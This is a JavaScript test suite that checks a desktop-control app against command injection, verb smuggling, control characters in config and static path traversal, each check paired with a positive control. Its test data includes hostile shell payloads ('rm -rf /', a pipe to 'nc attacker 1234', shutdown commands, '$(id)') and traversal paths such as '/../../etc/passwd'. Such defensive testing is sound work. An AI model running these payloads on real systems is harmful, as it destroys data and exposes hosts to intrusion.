/**
 * G7: hostile input is rejected, proven against positive controls.
 *
 * Every absence claim here is paired with a control that MUST be caught by the
 * same detector. An absence check with no positive control can pass because the
 * detector is broken, so each detector is exercised on known-bad input first.
 */
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { createChecker } from "./lib/assert.mjs";
import { validateControl } from "../src/platform/contract.js";
import { createWindowsProvider } from "../src/platform/windows.js";
import { createExec } from "../src/platform/index.js";
import { normalizeTile, normalizeTiles } from "../src/config.js";
import { resolveStatic } from "../server.js";

const t = createChecker("injection");
const root = join(import.meta.dirname, "..");
const PUBLIC = join(root, "public");

/** Payloads that would execute a second command in any shell-joined pipeline. */
const PAYLOADS = [
  "a & shutdown /s /t 0",
  "a && rm -rf /",
  "a; rm -rf /",
  "a | nc attacker 1234",
  "a`id`",
  "a$(id)",
  'a" & calc & "',
  "a\nshutdown /s",
  "a\r\nshutdown /s",
  "%SYSTEMROOT%\\system32\\calc.exe",
];

// ---- 1. argv containment ----
// Detector: after launching with a hostile target, argv must still be 2 long
// and element 1 must equal the payload verbatim.
const detectSplit = (args) => args.length !== 2 || args[1].includes(" ") === false;

for (const payload of PAYLOADS) {
  const calls = [];
  const win = createWindowsProvider({
    exec: async (file, args) => {
      calls.push(args);
      return { stdout: "" };
    },
    helperPath: "H.exe",
  });
  await win.launchApp({ target: `C:\\x\\${payload}.exe` });
  t.equal(calls[0].length, 2, `payload stays one argument: ${JSON.stringify(payload)}`);
  t.equal(calls[0][1], `C:\\x\\${payload}.exe`, `payload passed verbatim: ${JSON.stringify(payload)}`);
}

// Positive control: a deliberately shell-joined launcher MUST be flagged by the
// same length check, proving the check above can actually fail.
const joined = ["launch", ...`C:\\x\\a & shutdown /s /t 0.exe`.split(" ")];
t.ok(joined.length !== 2, "positive control: a shell-splitting launcher is detected");
t.ok(detectSplit(joined), "positive control: detector flags the unsafe argv");

// ---- 2. exec refuses non-string argv outright ----
const exec = createExec();
for (const bad of [["a", 1], ["a", null], ["a", {}], "notanarray"]) {
  await t.rejects(() => exec("echo", bad), `exec rejects non-string args: ${JSON.stringify(bad)}`);
}
await t.rejects(() => exec("", []), "exec rejects an empty file");
await t.rejects(() => exec(null, []), "exec rejects a null file");

// ---- 3. control verbs are allowlisted ----
for (const payload of PAYLOADS) {
  t.ok(!validateControl(payload, null).ok, `hostile verb rejected: ${JSON.stringify(payload)}`);
  t.ok(!validateControl(`volume-up${payload}`, null).ok, `suffixed verb rejected: ${JSON.stringify(payload)}`);
}
// Positive control: the validator must still admit a real verb, or the
// rejections above would be meaningless.
t.ok(validateControl("volume-up", null).ok, "positive control: a real verb is still accepted");

// ---- 4. config cannot smuggle a verb or a control character ----
t.equal(normalizeTile({ kind: "control", verb: "shutdown; rm -rf /" }), null, "hostile control tile is dropped");
t.equal(normalizeTile({ kind: "control", verb: "" }), null, "empty verb is dropped");
t.equal(normalizeTile({ kind: "nope", verb: "lock" }), null, "unknown tile kind is dropped");
t.equal(normalizeTile({ kind: "app", id: "", target: "x" }), null, "app tile without an id is dropped");
t.equal(normalizeTile({ kind: "app", id: "x", target: "" }), null, "app tile without a target is dropped");
t.equal(normalizeTile(null), null, "null tile is dropped");

const stripped = normalizeTile({ kind: "app", id: "a\u0000b", target: "t", label: "L\u0007M" });
t.ok(!stripped.id.includes("\u0000"), "NUL is stripped from a tile id");
t.ok(!stripped.label.includes("\u0007"), "control characters are stripped from a label");
// Positive control: the sanitizer must keep a clean tile intact.
const clean = normalizeTile({ kind: "control", verb: "lock", label: "Lock" });
t.ok(clean && clean.verb === "lock", "positive control: a valid control tile survives");

const deduped = normalizeTiles([
  { kind: "control", verb: "lock" },
  { kind: "control", verb: "lock" },
  { kind: "app", id: "a", target: "t" },
  { kind: "app", id: "a", target: "t" },
]);
t.equal(deduped.length, 2, "duplicate tiles collapse");
t.deepEqual(normalizeTiles("not an array"), [], "non-array tile input yields an empty list");
t.deepEqual(normalizeTiles([1, "x", null, {}]), [], "junk tile entries are all dropped");

// ---- 5. static path traversal ----
const TRAVERSALS = [
  "/../server.js",
  "/../../etc/passwd",
  "/..%2fserver.js",
  "/%2e%2e/server.js",
  "/subdir/../../server.js",
  "/....//server.js",
];
for (const p of TRAVERSALS) {
  const resolved = resolveStatic(p, PUBLIC);
  const escaped = resolved !== null && !resolved.startsWith(PUBLIC);
  t.ok(!escaped, `traversal contained: ${p} -> ${resolved ?? "refused"}`);
}
// Positive control: a normal asset must still resolve inside public/, proving
// resolveStatic is not simply refusing everything.
const ok = resolveStatic("/style.css", PUBLIC);
t.ok(ok !== null && ok.startsWith(PUBLIC), "positive control: a normal asset resolves inside public");
t.equal(resolveStatic("/", PUBLIC), join(PUBLIC, "index.html"), "root resolves to index.html");
// Positive control for the escape detector itself.
t.ok(!join(PUBLIC, "..", "server.js").startsWith(PUBLIC + "/"), "positive control: escape detector works");

// ---- 6. the shipped PowerShell is constant ----
const winSrc = readFileSync(join(root, "src", "platform", "windows.js"), "utf8");
const psBlocks = winSrc.match(/export const \w+_PS = \[[\s\S]*?\].join\(" "\);/g) || [];
t.ok(psBlocks.length >= 3, `found ${psBlocks.length} PowerShell blocks to inspect`);
for (const block of psBlocks) {
  t.ok(!/\$\{/.test(block), "PowerShell block contains no template interpolation");
}
t.ok(!/exec\(\s*`/.test(winSrc), "no exec call is built from a template literal");
// Positive control: the interpolation detector must flag a known-bad sample.
t.ok(/\$\{/.test("const x = `a ${evil} b`;"), "positive control: interpolation detector works");

t.done("injection verification passed");
